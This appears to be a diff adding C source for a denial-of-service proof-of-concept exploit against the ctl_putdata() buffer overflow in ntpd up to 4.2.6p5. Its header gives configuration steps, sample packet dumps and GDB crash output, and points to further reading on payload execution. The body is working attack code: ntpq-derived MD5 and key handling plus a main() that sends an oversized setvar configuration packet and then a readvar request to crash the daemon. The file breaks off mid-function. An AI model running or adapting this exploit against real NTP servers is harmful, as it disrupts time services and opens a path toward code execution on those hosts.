@@ -1,0 +1,1154 @@
+/*
+Ntpd <= ntp-4.2.6p5 ctl_putdata() Buffer Overflow
+Author: Marcin Kozlowski <marcinguy@yahoo.com>
+Based on: ntpq client from ntp package
+
+Provided for legal security research and testing purposes ONLY
+
+PoC
+
+DoS (Denial of Service) PoC. Will crash NTPd.
+
+You will need to know the KEY ID and MD5 password, for example put this in you ntp.conf
+
+--------------
+/etc/ntp.conf
+--------------
+
+keys /etc/ntp.keys
+trustedkey 1
+requestkey 1
+controlkey 1
+
+
+and in /etc/ntp.keys
+
+-------------
+/etc/ntp.keys
+-------------
+
+1 M 1111111
+
+
+
+
+1 is KEY ID 
+1111111 is MD5 password
+
+Hostname and Port is hardcoded in the code. Change it if you want :)
+
+gcc ntpd-exp.c -o ntpd-exp
+
+./ntpd-exp
+Keyid: 1
+MD5 Password: 
+Sending 988 octets
+Packet data:
+ 16 08 00 00 00 00 00 00
+ 00 00 03 b7 73 65 74 76
+ ...
+ 00 00 00 01 28 05 99 c2
+ 16 ba a7 b7 8d d3 22 00
+ 0c f7 6a 5f
+Sending 36 octets
+Packet data:
+ 16 02 00 00 00 00 00 00
+ 00 00 00 01 41 00 00 00
+ 00 00 00 01 7b a5 e6 6e
+ e7 a7 f7 cd 65 8f 1d 5f
+ 51 92 d0 41
+
+KABOOM Ntpd should crash!!!
+
+GDB output:
+
+Program received signal SIGSEGV, Segmentation fault.
+read_variables (rbufp=<optimized out>, restrict_mask=<optimized out>)
+    at ntp_control.c:2300
+2300				for (i = 0; ext_sys_var &&
+(gdb) 
+
+
+
+
+If you want to bypass knowing KEY ID and MD5 Password and execute your payload, read more:
+
+http://googleprojectzero.blogspot.com/2015/01/finding-and-exploiting-ntpd.html
+
+
+*/
+
+#include <stdio.h>
+#include <ctype.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <stdint.h>
+#include <stddef.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h> 
+
+
+typedef unsigned short associd_t; /* association ID */
+typedef uint32_t keyid_t;
+typedef int SOCKET;
+
+struct sockaddr_in serverAddr;
+socklen_t addr_size;	
+
+#define	CTL_MAX_DATA_LEN	1300
+#define	MAX_MAC_LEN	(6 * sizeof(uint32_t))	/* SHA */
+
+#define	MODE_CONTROL	6	/* control mode */
+
+#define CTL_OP_CONFIGURE	8
+
+#define	CTL_OP_READVAR		2
+
+#define	CTL_OP_MASK	0x1f
+
+#define NID_md5	4
+#define NTP_MAXKEY	65535
+
+
+/*
+ * Stuff for putting things back into li_vn_mode
+ */
+#define PKT_LI_VN_MODE(li, vn, md) \
+        ((u_char)((((li) << 6) & 0xc0) | (((vn) << 3) & 0x38) | ((md) & 0x7)))
+
+#define F1(x, y, z) (z ^ (x & (y ^ z)))
+#define F2(x, y, z) F1(z, x, y)
+#define F3(x, y, z) (x ^ y ^ z)
+#define F4(x, y, z) (y ^ (x | ~z))
+
+#define MD5STEP(f,w,x,y,z,in,s) \
+         (w += f(x,y,z) + in, w = (w<<s | w>>(32-s)) + x)
+
+
+struct ntp_control {
+        u_char li_vn_mode;              /* leap, version, mode */
+        u_char r_m_e_op;                /* response, more, error, opcode */
+        u_short sequence;               /* sequence number of request */
+        u_short status;                 /* status word for association */
+        associd_t associd;              /* association ID */
+        u_short offset;                 /* offset of this batch of data */
+        u_short count;                  /* count of data in this packet */
+        u_char data[(1300 + MAX_MAC_LEN)]; /* data + auth */
+};
+
+#define	NTP_OLDVERSION	((u_char)1)
+u_char pktversion = NTP_OLDVERSION + 1;
+
+#define	CTL_HEADER_LEN		(offsetof(struct ntp_control, data))
+
+/*
+ * COUNTOF(array) - size of array in elements
+ */
+#define COUNTOF(arr)    (sizeof(arr) / sizeof((arr)[0]))
+
+
+
+/*
+ * Sequence number used for requests.  It is incremented before
+ * it is used.
+ */
+u_short sequence;
+
+/*
+ * Flag which indicates we should always send authenticated requests
+ */
+int always_auth = 0;
+
+/*
+ * Keyid used for authenticated requests.  Obtained on the fly.
+ */
+u_long info_auth_keyid = 0;
+
+static	int	info_auth_keytype = NID_md5;	/* MD5 */
+static	size_t	info_auth_hashlen = 16;		/* MD5 */
+
+int debug = 10;
+
+SOCKET sockfd;					/* fd socket is opened on */
+
+char currenthost[256];			/* current host name */
+
+char *progname = "exp";
+
+struct savekey {
+        struct savekey *next;
+        union {
+                u_char MD5_key[64];     /* for keys up to to 512 bits */
+        } k;
+        keyid_t keyid;          /* key identifier */
+        int     type;           /* key type */
+        u_short flags;          /* flags that wave */
+        u_long lifetime;        /* remaining lifetime */
+        int keylen;             /* key length */
+};
+
+/*
+ * The key cache. We cache the last key we looked at here.
+ */
+keyid_t cache_keyid;            /* key identifier */
+u_char  *cache_key;             /* key pointer */
+u_int   cache_keylen;           /* key length */
+int     cache_type;             /* key type */
+u_short cache_flags;            /* flags that wave */
+
+
+#define KEY_TRUSTED     0x001   /* this key is trusted */
+
+#define	MEMINC	12	
+
+#define EVP_MAX_MD_SIZE	64
+
+typedef struct {
+        uint32_t buf[4];
+        uint32_t bytes[2];
+        uint32_t in[16];
+} isc_md5_t;
+
+/*
+ * ntp_md5.h: deal with md5.h headers
+ *
+ * Use the system MD5 if available, otherwise libisc's.
+ */
+
+
+
+typedef isc_md5_t             MD5_CTX;
+#define MD5Init(c)             isc_md5_init(c)
+#define MD5Update(c, p, s)     isc_md5_update(c, p, s)
+#define MD5Final(d, c)         isc_md5_final((c), (d)) /* swapped */
+
+/* ssl_init.c */
+#ifdef OPENSSL
+extern  void    ssl_init                (void);
+extern  void    ssl_check_version       (void);
+extern  int     ssl_init_done;
+#define INIT_SSL()                              \
+        do {                                    \
+                if (!ssl_init_done)             \
+                        ssl_init();             \
+        } while (0)
+#else   /* !OPENSSL follows */
+#define INIT_SSL()              do {} while (0)
+#endif
+
+#if defined HAVE_MD5_H && defined HAVE_MD5INIT
+# include <md5.h>
+#else
+  typedef isc_md5_t             MD5_CTX;
+# define MD5Init(c)             isc_md5_init(c)
+# define MD5Update(c, p, s)     isc_md5_update(c, p, s)
+# define MD5Final(d, c)         isc_md5_final((c), (d)) /* swapped */
+#endif
+
+
+
+
+
+/*
+ * Provide OpenSSL-alike MD5 API if we're not using OpenSSL
+ */
+
+typedef MD5_CTX                       EVP_MD_CTX;
+#define EVP_get_digestbynid(t)         NULL
+#define EVP_DigestInit(c, dt)          MD5Init(c)
+#define EVP_DigestUpdate(c, p, s)      MD5Update(c, p, s)
+#define EVP_DigestFinal(c, d, pdl)     \
+        do {                            \
+                MD5Final((d), (c));     \
+                *(pdl) = 16;            \
+        } while (0)
+
+                         
+/*
+ * The hash table. This is indexed by the low order bits of the
+ * keyid. We make this fairly big for potentially busy servers.
+ */
+#define HASHSIZE        64
+#define HASHMASK        ((HASHSIZE)-1)
+#define KEYHASH(keyid)  ((keyid) & HASHMASK)
+
+
+#define min(a,b)        (((a) < (b)) ? (a) : (b))
+
+
+struct savekey *key_hash[HASHSIZE];
+
+u_long authkeynotfound;         /* keys not found */
+u_long authkeylookups;          /* calls to lookup keys */
+u_long authnumkeys;             /* number of active keys */
+u_long authkeyexpired;          /* key lifetime expirations */
+u_long authkeyuncached;         /* cache misses */
+u_long authnokey;               /* calls to encrypt with no key */
+u_long authencryptions;         /* calls to encrypt */
+u_long authdecryptions;         /* calls to decrypt */
+
+struct savekey *authfreekeys;
+
+int authnumfreekeys;
+u_long current_time;
+
+
+/*!
+ * The core of the MD5 algorithm, this alters an existing MD5 hash to
+ * reflect the addition of 16 longwords of new data.  MD5Update blocks
+ * the data and converts bytes into longwords for this routine.
+ */
+
+void
+transform(uint32_t buf[4], uint32_t const in[16]) {
+	register uint32_t a, b, c, d;
+
+	a = buf[0];
+	b = buf[1];
+	c = buf[2];
+	d = buf[3];
+
+	MD5STEP(F1, a, b, c, d, in[0] + 0xd76aa478, 7);
+	MD5STEP(F1, d, a, b, c, in[1] + 0xe8c7b756, 12);
+	MD5STEP(F1, c, d, a, b, in[2] + 0x242070db, 17);
+	MD5STEP(F1, b, c, d, a, in[3] + 0xc1bdceee, 22);
+	MD5STEP(F1, a, b, c, d, in[4] + 0xf57c0faf, 7);
+	MD5STEP(F1, d, a, b, c, in[5] + 0x4787c62a, 12);
+	MD5STEP(F1, c, d, a, b, in[6] + 0xa8304613, 17);
+	MD5STEP(F1, b, c, d, a, in[7] + 0xfd469501, 22);
+	MD5STEP(F1, a, b, c, d, in[8] + 0x698098d8, 7);
+	MD5STEP(F1, d, a, b, c, in[9] + 0x8b44f7af, 12);
+	MD5STEP(F1, c, d, a, b, in[10] + 0xffff5bb1, 17);
+	MD5STEP(F1, b, c, d, a, in[11] + 0x895cd7be, 22);
+	MD5STEP(F1, a, b, c, d, in[12] + 0x6b901122, 7);
+	MD5STEP(F1, d, a, b, c, in[13] + 0xfd987193, 12);
+	MD5STEP(F1, c, d, a, b, in[14] + 0xa679438e, 17);
+	MD5STEP(F1, b, c, d, a, in[15] + 0x49b40821, 22);
+
+	MD5STEP(F2, a, b, c, d, in[1] + 0xf61e2562, 5);
+	MD5STEP(F2, d, a, b, c, in[6] + 0xc040b340, 9);
+	MD5STEP(F2, c, d, a, b, in[11] + 0x265e5a51, 14);
+	MD5STEP(F2, b, c, d, a, in[0] + 0xe9b6c7aa, 20);
+	MD5STEP(F2, a, b, c, d, in[5] + 0xd62f105d, 5);
+	MD5STEP(F2, d, a, b, c, in[10] + 0x02441453, 9);
+	MD5STEP(F2, c, d, a, b, in[15] + 0xd8a1e681, 14);
+	MD5STEP(F2, b, c, d, a, in[4] + 0xe7d3fbc8, 20);
+	MD5STEP(F2, a, b, c, d, in[9] + 0x21e1cde6, 5);
+	MD5STEP(F2, d, a, b, c, in[14] + 0xc33707d6, 9);
+	MD5STEP(F2, c, d, a, b, in[3] + 0xf4d50d87, 14);
+	MD5STEP(F2, b, c, d, a, in[8] + 0x455a14ed, 20);
+	MD5STEP(F2, a, b, c, d, in[13] + 0xa9e3e905, 5);
+	MD5STEP(F2, d, a, b, c, in[2] + 0xfcefa3f8, 9);
+	MD5STEP(F2, c, d, a, b, in[7] + 0x676f02d9, 14);
+	MD5STEP(F2, b, c, d, a, in[12] + 0x8d2a4c8a, 20);
+
+	MD5STEP(F3, a, b, c, d, in[5] + 0xfffa3942, 4);
+	MD5STEP(F3, d, a, b, c, in[8] + 0x8771f681, 11);
+	MD5STEP(F3, c, d, a, b, in[11] + 0x6d9d6122, 16);
+	MD5STEP(F3, b, c, d, a, in[14] + 0xfde5380c, 23);
+	MD5STEP(F3, a, b, c, d, in[1] + 0xa4beea44, 4);
+	MD5STEP(F3, d, a, b, c, in[4] + 0x4bdecfa9, 11);
+	MD5STEP(F3, c, d, a, b, in[7] + 0xf6bb4b60, 16);
+	MD5STEP(F3, b, c, d, a, in[10] + 0xbebfbc70, 23);
+	MD5STEP(F3, a, b, c, d, in[13] + 0x289b7ec6, 4);
+	MD5STEP(F3, d, a, b, c, in[0] + 0xeaa127fa, 11);
+	MD5STEP(F3, c, d, a, b, in[3] + 0xd4ef3085, 16);
+	MD5STEP(F3, b, c, d, a, in[6] + 0x04881d05, 23);
+	MD5STEP(F3, a, b, c, d, in[9] + 0xd9d4d039, 4);
+	MD5STEP(F3, d, a, b, c, in[12] + 0xe6db99e5, 11);
+	MD5STEP(F3, c, d, a, b, in[15] + 0x1fa27cf8, 16);
+	MD5STEP(F3, b, c, d, a, in[2] + 0xc4ac5665, 23);
+
+	MD5STEP(F4, a, b, c, d, in[0] + 0xf4292244, 6);
+	MD5STEP(F4, d, a, b, c, in[7] + 0x432aff97, 10);
+	MD5STEP(F4, c, d, a, b, in[14] + 0xab9423a7, 15);
+	MD5STEP(F4, b, c, d, a, in[5] + 0xfc93a039, 21);
+	MD5STEP(F4, a, b, c, d, in[12] + 0x655b59c3, 6);
+	MD5STEP(F4, d, a, b, c, in[3] + 0x8f0ccc92, 10);
+	MD5STEP(F4, c, d, a, b, in[10] + 0xffeff47d, 15);
+	MD5STEP(F4, b, c, d, a, in[1] + 0x85845dd1, 21);
+	MD5STEP(F4, a, b, c, d, in[8] + 0x6fa87e4f, 6);
+	MD5STEP(F4, d, a, b, c, in[15] + 0xfe2ce6e0, 10);
+	MD5STEP(F4, c, d, a, b, in[6] + 0xa3014314, 15);
+	MD5STEP(F4, b, c, d, a, in[13] + 0x4e0811a1, 21);
+	MD5STEP(F4, a, b, c, d, in[4] + 0xf7537e82, 6);
+	MD5STEP(F4, d, a, b, c, in[11] + 0xbd3af235, 10);
+	MD5STEP(F4, c, d, a, b, in[2] + 0x2ad7d2bb, 15);
+	MD5STEP(F4, b, c, d, a, in[9] + 0xeb86d391, 21);
+
+	buf[0] += a;
+	buf[1] += b;
+	buf[2] += c;
+	buf[3] += d;
+}
+
+void
+byteSwap(uint32_t *buf, unsigned words)
+{
+        unsigned char *p = (unsigned char *)buf;
+
+        do {
+                *buf++ = (uint32_t)((unsigned)p[3] << 8 | p[2]) << 16 |
+                        ((unsigned)p[1] << 8 | p[0]);
+                p += 4;
+        } while (--words);
+}
+
+
+	
+/*!
+ * Final wrapup - pad to 64-byte boundary with the bit pattern
+ * 1 0* (64-bit count of bits processed, MSB-first)
+ */
+void
+isc_md5_final(isc_md5_t *ctx, unsigned char *digest) {
+        int count = ctx->bytes[0] & 0x3f;    /* Number of bytes in ctx->in */
+        unsigned char *p = (unsigned char *)ctx->in + count;
+
+        /* Set the first char of padding to 0x80.  There is always room. */
+        *p++ = 0x80;
+
+        /* Bytes of padding needed to make 56 bytes (-8..55) */
+        count = 56 - 1 - count;
+
+        if (count < 0) {        /* Padding forces an extra block */
+                memset(p, 0, count + 8);
+                byteSwap(ctx->in, 16);
+                transform(ctx->buf, ctx->in);
+                p = (unsigned char *)ctx->in;
+                count = 56;
+        }
+        memset(p, 0, count);
+        byteSwap(ctx->in, 14);
+
+        /* Append length in bits and transform */
+        ctx->in[14] = ctx->bytes[0] << 3;
+        ctx->in[15] = ctx->bytes[1] << 3 | ctx->bytes[0] >> 29;
+        transform(ctx->buf, ctx->in);
+
+        byteSwap(ctx->buf, 4);
+        memcpy(digest, ctx->buf, 16);
+        memset(ctx, 0, sizeof(isc_md5_t));      /* In case it's sensitive */
+}
+
+
+
+
+
+
+/*!
+ * Update context to reflect the concatenation of another buffer full
+ * of bytes.
+ */
+void
+isc_md5_update(isc_md5_t *ctx, const unsigned char *buf, unsigned int len) {
+        uint32_t t;
+
+        /* Update byte count */
+
+        t = ctx->bytes[0];
+        if ((ctx->bytes[0] = t + len) < t)
+                ctx->bytes[1]++;        /* Carry from low to high */
+
+        t = 64 - (t & 0x3f);    /* Space available in ctx->in (at least 1) */
+        if (t > len) {
+                memcpy((unsigned char *)ctx->in + 64 - t, buf, len);
+                return;
+        }
+        /* First chunk is an odd size */
+        memcpy((unsigned char *)ctx->in + 64 - t, buf, t);
+        byteSwap(ctx->in, 16);
+        transform(ctx->buf, ctx->in);
+        buf += t;
+        len -= t;
+
+        /* Process data in 64-byte chunks */
+        while (len >= 64) {
+                memcpy(ctx->in, buf, 64);
+                byteSwap(ctx->in, 16);
+                transform(ctx->buf, ctx->in);
+                buf += 64;
+                len -= 64;
+        }
+
+        /* Handle any remaining bytes of data. */
+        memcpy(ctx->in, buf, len);
+}
+
+
+
+/*!
+ * Start MD5 accumulation.  Set bit count to 0 and buffer to mysterious
+ * initialization constants.
+ */
+void
+isc_md5_init(isc_md5_t *ctx) {
+        ctx->buf[0] = 0x67452301;
+        ctx->buf[1] = 0xefcdab89;
+        ctx->buf[2] = 0x98badcfe;
+        ctx->buf[3] = 0x10325476;
+
+        ctx->bytes[0] = 0;
+        ctx->bytes[1] = 0;
+}
+
+
+/*
+ * MD5authencrypt - generate message digest
+ *
+ * Returns length of MAC including key ID and digest.
+ */
+int
+MD5authencrypt(
+        int     type,           /* hash algorithm */
+        u_char  *key,           /* key pointer */
+        uint32_t *pkt,           /* packet pointer */
+        int     length          /* packet length */
+        )
+{
+        u_char  digest[EVP_MAX_MD_SIZE];
+        u_int   len;
+        EVP_MD_CTX ctx;
+
+        /*
+         * Compute digest of key concatenated with packet. Note: the
+         * key type and digest type have been verified when the key
+         * was creaded.
+         */
+        INIT_SSL();
+        EVP_DigestInit(&ctx, EVP_get_digestbynid(type));
+        EVP_DigestUpdate(&ctx, key, (u_int)cache_keylen);
+        EVP_DigestUpdate(&ctx, (u_char *)pkt, (u_int)length);
+        EVP_DigestFinal(&ctx, digest, &len);
+        memmove((u_char *)pkt + length + 4, digest, len);
+        return (len + 4);
+}
+
+
+
+
+/*
+ * authhavekey - return one and cache the key, if known and trusted.
+ */
+int
+authhavekey(
+	keyid_t keyno
+	)
+{
+	struct savekey *sk;
+
+	authkeylookups++;
+	if (keyno == 0 || keyno == cache_keyid)
+		return (1);
+
+	/*
+	 * Seach the bin for the key. If found and the key type
+	 * is zero, somebody marked it trusted without specifying
+	 * a key or key type. In this case consider the key missing.
+	 */
+	authkeyuncached++;
+	sk = key_hash[KEYHASH(keyno)];
+	while (sk != NULL) {
+		if (keyno == sk->keyid) {
+			if (sk->type == 0) {
+				authkeynotfound++;
+				return (0);
+			}
+			break;
+		}
+		sk = sk->next;
+	}
+
+	/*
+	 * If the key is not found, or if it is found but not trusted,
+	 * the key is not considered found.
+	 */
+	if (sk == NULL) {
+		authkeynotfound++;
+		return (0);
+
+	}
+	if (!(sk->flags & KEY_TRUSTED)) {
+		authnokey++;
+		return (0);
+	}
+
+	/*
+	 * The key is found and trusted. Initialize the key cache.
+	 */
+	cache_keyid = sk->keyid;
+	cache_type = sk->type;
+	cache_flags = sk->flags;
+	cache_key = sk->k.MD5_key;
+	cache_keylen = sk->keylen;
+	return (1);
+}
+
+
+
+/*
+ * authencrypt - generate message authenticator
+ *
+ * Returns length of authenticator field, zero if key not found.
+ */
+int
+authencrypt(
+        keyid_t keyno,
+        uint32_t *pkt,
+        int length
+        )
+{
+
+        /*
+         * A zero key identifier means the sender has not verified
+         * the last message was correctly authenticated. The MAC
+         * consists of a single word with value zero.
+         */
+        authencryptions++;
+        pkt[length / 4] = htonl(keyno);
+        if (keyno == 0) {
+                return (4);
+        }
+        if (!authhavekey(keyno))
+                return (0);
+
+        return (MD5authencrypt(cache_type, cache_key, pkt, length));
+}
+
+
+/*
+ * authtrust - declare a key to be trusted/untrusted
+ */
+void
+authtrust(
+	keyid_t keyno,
+	u_long trust
+	)
+{
+	struct savekey *sk;
+
+	/*
+	 * Search bin for key; if it does not exist and is untrusted,
+	 * forget it.
+	 */
+	sk = key_hash[KEYHASH(keyno)];
+	while (sk != 0) {
+		if (keyno == sk->keyid)
+		    break;
+
+		sk = sk->next;
+	}
+	if (sk == 0 && !trust)
+		return;
+
+	/*
+	 * There are two conditions remaining. Either it does not
+	 * exist and is to be trusted or it does exist and is or is
+	 * not to be trusted.
+	 */	
+	if (sk != 0) {
+		if (cache_keyid == keyno) {
+			cache_flags = 0;
+			cache_keyid = 0;
+		}
+
+		/*
+		 * Key exists. If it is to be trusted, say so and
+		 * update its lifetime. If not, return it to the
+		 * free list.
+		 */
+		if (trust > 0) {
+			sk->flags |= KEY_TRUSTED;
+			if (trust > 1)
+				sk->lifetime = current_time + trust;
+			else
+				sk->lifetime = 0;
+			return;
+		}
+		sk->flags &= ~KEY_TRUSTED; {
+			struct savekey *skp;
+
+			skp = key_hash[KEYHASH(keyno)];
+			if (skp == sk) {
+				key_hash[KEYHASH(keyno)] = sk->next;
+			} else {
+				while (skp->next != sk)
+				    skp = skp->next;
+				skp->next = sk->next;
+			}
+			authnumkeys--;
+
+			sk->next = authfreekeys;
+			authfreekeys = sk;
+			authnumfreekeys++;
+		}
+		return;
+	}
+
+	/*
+	 * Here there is not key, but the key is to be trusted. There
+	 * seems to be a disconnect here. Here we allocate a new key,
+	 * but do not specify a key type, key or key length.
+	 */ 
+	if (authnumfreekeys == 0)
+	    if (auth_moremem() == 0)
+		return;
+
+	sk = authfreekeys;
+	authfreekeys = sk->next;
+	authnumfreekeys--;
+	sk->keyid = keyno;
+	sk->type = 0;
+	sk->keylen = 0;
+	sk->flags = KEY_TRUSTED;
+	sk->next = key_hash[KEYHASH(keyno)];
+	key_hash[KEYHASH(keyno)] = sk;
+	authnumkeys++;
+	return;
+}
+
+
+
+
+/*
+ * auth_moremem - get some more free key structures
+ */
+int
+auth_moremem(void)
+{
+        struct savekey *sk;
+        int i;
+
+        sk = (struct savekey *)calloc(MEMINC, sizeof(struct savekey));
+        if (sk == 0)
+                return (0);
+
+        for (i = MEMINC; i > 0; i--) {
+                sk->next = authfreekeys;
+                authfreekeys = sk++;
+        }
+        authnumfreekeys += MEMINC;
+        return (authnumfreekeys);
+}
+
+
+void
+MD5auth_setkey(
+	keyid_t keyno,
+	int	keytype,
+	const u_char *key,
+	const int len
+	)
+{
+	struct savekey *sk;
+	
+	/*
+	 * See if we already have the key.  If so just stick in the
+	 * new value.
+	 */
+	sk = key_hash[KEYHASH(keyno)];
+	while (sk != NULL) {
+		if (keyno == sk->keyid) {
+			sk->type = keytype;
+			sk->keylen = min(len, sizeof(sk->k.MD5_key));
+#ifndef DISABLE_BUG1243_FIX
+			memcpy(sk->k.MD5_key, key, sk->keylen);
+#else
+			strncpy((char *)sk->k.MD5_key, (const char *)key,
+			    sizeof(sk->k.MD5_key));
+#endif
+			if (cache_keyid == keyno) {
+				cache_flags = 0;
+				cache_keyid = 0;
+			}
+			return;
+		}
+		sk = sk->next;
+	}
+
+	/*
+	 * Need to allocate new structure.  Do it.
+	 */
+	if (0 == authnumfreekeys && !auth_moremem())
+		return;
+
+	sk = authfreekeys;
+	authfreekeys = sk->next;
+	authnumfreekeys--;
+
+	sk->keyid = keyno;
+	sk->type = keytype;
+	sk->flags = 0;
+	sk->lifetime = 0;
+	sk->keylen = min(len, sizeof(sk->k.MD5_key));
+#ifndef DISABLE_BUG1243_FIX
+	memcpy(sk->k.MD5_key, key, sk->keylen);
+#else
+	strncpy((char *)sk->k.MD5_key, (const char *)key,
+	    sizeof(sk->k.MD5_key));
+#endif
+	sk->next = key_hash[KEYHASH(keyno)];
+	key_hash[KEYHASH(keyno)] = sk;
+#ifdef DEBUG
+	if (debug > 1) {
+		char	hex[] = "0123456789abcdef";
+		int	j;
+
+		printf("auth_setkey: key %d type %d len %d ", sk->keyid,
+		    sk->type, sk->keylen);
+		for (j = 0; j < sk->keylen; j++)
+				printf("%c%c", hex[key[j] >> 4],
+				    hex[key[j] & 0xf]);
+		printf("\n");
+	}	
+#endif
+	authnumkeys++;
+}
+
+
+/*
+ * Types of ascii representations for keys.  "Standard" means a 64 bit
+ * hex number in NBS format, i.e. with the low order bit of each byte
+ * a parity bit.  "NTP" means a 64 bit key in NTP format, with the
+ * high order bit of each byte a parity bit.  "Ascii" means a 1-to-8
+ * character string whose ascii representation is used as the key.
+ */
+int
+authusekey(
+        keyid_t keyno,
+        int keytype,
+        const u_char *str
+        )
+{
+        const u_char *cp;
+        int len;
+
+        cp = str;
+        len = strlen((const char *)cp);
+        if (len == 0)
+                return 0;
+
+        MD5auth_setkey(keyno, keytype, str, (int)strlen((const char *)str));
+        return 1;
+}
+
+
+/*
+ * keytype_name         returns OpenSSL short name for digest by NID.
+ *
+ * Used by ntpq and ntpdc keytype()
+ */
+const char *
+keytype_name(
+        int nid
+        )
+{
+        static const char unknown_type[] = "(unknown key type)";
+        const char *name;
+
+#ifdef OPENSSL
+        INIT_SSL();
+        name = OBJ_nid2sn(nid);
+        if (NULL == name)
+                name = unknown_type;
+#else   /* !OPENSSL follows */
+        if (NID_md5 == nid)
+                name = "MD5";
+        else
+                name = unknown_type;
+#endif
+        return name;
+}
+
+
+/*
+ * getpass_keytype() -- shared between ntpq and ntpdc, only vaguely
+ *                      related to the rest of ssl_init.c.
+ */
+char *
+getpass_keytype(
+        int     keytype
+        )
+{
+        char    pass_prompt[64 + 11 + 1]; /* 11 for " Password: " */
+
+        snprintf(pass_prompt, sizeof(pass_prompt),
+                 "%.64s Password: ", keytype_name(keytype));
+
+        return getpass(pass_prompt);
+}
+
+
+int
+authistrusted(
+        keyid_t keyno
+        )
+{
+        struct savekey *sk;
+
+        if (keyno == cache_keyid)
+            return ((cache_flags & KEY_TRUSTED) != 0);
+
+        authkeyuncached++;
+        sk = key_hash[KEYHASH(keyno)];
+        while (sk != 0) {
+                if (keyno == sk->keyid)
+                    break;
+                sk = sk->next;
+        }
+        if (sk == 0) {
+                authkeynotfound++;
+                return (0);
+
+        } else if (!(sk->flags & KEY_TRUSTED)) {
+                authkeynotfound++;
+                return (0);
+        }
+        return (1);
+}
+
+
+
+u_long
+getkeyid(
+	const char *keyprompt
+	)
+{
+	int c;
+	FILE *fi;
+	char pbuf[20];
+	size_t i;
+	size_t ilim;
+
+#ifndef SYS_WINNT
+	if ((fi = fdopen(open("/dev/tty", 2), "r")) == NULL)
+#else
+	if ((fi = _fdopen(open("CONIN$", _O_TEXT), "r")) == NULL)
+#endif /* SYS_WINNT */
+		fi = stdin;
+	else
+		setbuf(fi, (char *)NULL);
+	fprintf(stderr, "%s", keyprompt); fflush(stderr);
+	for (i = 0, ilim = COUNTOF(pbuf) - 1;
+	     i < ilim && (c = getc(fi)) != '\n' && c != EOF;
+	     )
+		pbuf[i++] = (char)c;
+	pbuf[i] = '\0';
+	if (fi != stdin)
+		fclose(fi);
+
+	return (u_long) atoi(pbuf);
+}
+
+
+void
+warning(
+	const char *fmt,
+	const char *st1,
+	const char *st2
+	)
+{
+	(void) fprintf(stderr, "%s: ", progname);
+	(void) fprintf(stderr, fmt, st1, st2);
+	(void) fprintf(stderr, ": ");
+	perror("");
+}
+
+
+int
+sendpkt(
+	void *	xdata,
+	size_t	xdatalen
+	)
+{
+	if (debug >= 3)
+		printf("Sending %lu octets\n", (u_long)xdatalen);
+        
+        sendto(sockfd,xdata,(size_t)xdatalen, 0,(struct sockaddr *)&serverAddr,addr_size);
+
+
+	if (debug >= 4) {
+		int first = 8;
+		char *cdata = xdata;
+
+		printf("Packet data:\n");
+		while (xdatalen-- > 0) {
+			if (first-- == 0) {
+				printf("\n");
+				first = 7;
+			}
+			printf(" %02x", *cdata++ & 0xff);
+		}
+		printf("\n");
+	}
+	return 0;
+}
+
+
+void error(char *msg)
+{
+    perror(msg);
+    exit(0);
+}
+
+
+int main(int argc, char *argv[])
+{
+
+  char *cfgcmd;
+  u_short rstatus;
+  int rsize;
+  const char *rdata;
+  char *resp;
+  int res;
+  int col;
+  int i;
+     
+  int portNum, nBytes;
+  char buffer[1024];
+
+
+  /*Create UDP socket*/
+  sockfd = socket(PF_INET, SOCK_DGRAM, 0);
+
+  /*Configure settings in address struct*/
+  serverAddr.sin_family = AF_INET;
+  serverAddr.sin_port = htons(123);
+  serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+  memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);  
+
+  /*Initialize size variable to be used later on*/
+  addr_size = sizeof serverAddr;
+
+
+
+
+  cfgcmd = "setvar A = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+
+  res = sendrequest(CTL_OP_CONFIGURE, 0, 1, strlen(cfgcmd), cfgcmd,
+		      &rstatus, &rsize, &rdata);
+
+  sleep(5);
+  cfgcmd = "A";
+
+  res = sendrequest(CTL_OP_READVAR, 0, 1, strlen(cfgcmd), cfgcmd, 
+                       &rstatus, &rsize, &rdata);
+
+
+}
+
+/*
+ * sendrequest - format and send a request packet
+ */
+int
+sendrequest(
+	int opcode,
+	int associd,
+	int auth,
+	int qsize,
+	char *qdata
+	)
+{
+	struct ntp_control qpkt;
+	int	pktsize;
+	u_long	key_id;
+	char *	pass;
+	int	maclen;
+
+	/*
+	 * Check to make sure the data will fit in one packet
+	 */
+	if (qsize > CTL_MAX_DATA_LEN) {
+		fprintf(stderr,
